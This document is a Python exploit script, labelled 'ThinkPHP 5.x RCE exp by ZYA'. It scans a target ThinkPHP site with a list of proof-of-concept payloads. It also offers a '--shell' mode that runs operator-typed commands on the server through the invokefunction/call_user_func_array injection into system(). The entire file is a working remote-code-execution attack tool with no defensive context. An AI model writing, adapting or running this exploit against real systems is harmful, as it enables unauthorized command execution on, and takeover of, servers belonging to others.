import requests
import re
import optparse

def test_url(url):
    num = 0
    f = open("thinkphp_poc.txt")
    #url = input('Your taget name:(e.g.http://magic-mirro.com/thinkphp/public/index.php):')
    #url = "http://magic-mirro.com/thinkphp/public/index.php"
    for exp in f:
        print ("[o]Trying poc: " + url + exp)
        try:
            r=requests.get(url + exp)
        except:
            continue
        exist = re.findall('HttpException',r.text)
        #print(exist)
        #exist = re.findall('<br/>\\n(.*?)</p>',content)
        if (exist):
            print('[-]Failed\n')
            continue
        else:
            print("[+]Seem Exist!\n")
            num=num+1
            print("[+]Response:\n"+r.text + '\n'+ '-'*200)
    print("[+++]Test Done!" + str(num) + " poc(s) seem can be use")
def getshell(url):
    #url = input('Your taget name:(e.g.http://magic-mirro.com/thinkphp/public/index.php):')
    while (True):
        cmd = raw_input('\nShell by-zya$')
        exp = "?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php -r\'system(\""+ cmd +"\");'"
        r=requests.get(url + exp)
        print(r.text)
def main():
    parser = optparse.OptionParser("ThinkPHP 5.x RCE exp by ZYA\n useage %prog "+"-u <url>")
    parser.add_option('-u', dest='u', type='string', help='Target URL')
    parser.add_option('--shell', dest='shell', action='store_true', help='Prompt for an interactive operating system shell')
    #parser.add_option('--s2', dest='s2', type='string', help='specify string2')
    (options, args) = parser.parse_args()
    if options.shell == None and options.u != None:
        test_url(options.u);
        exit(0)
    elif options.shell != None and options.u != None:
        getshell(options.u)
    else:
        print(parser.usage)
        exit(0)
if __name__ == '__main__':
    main()
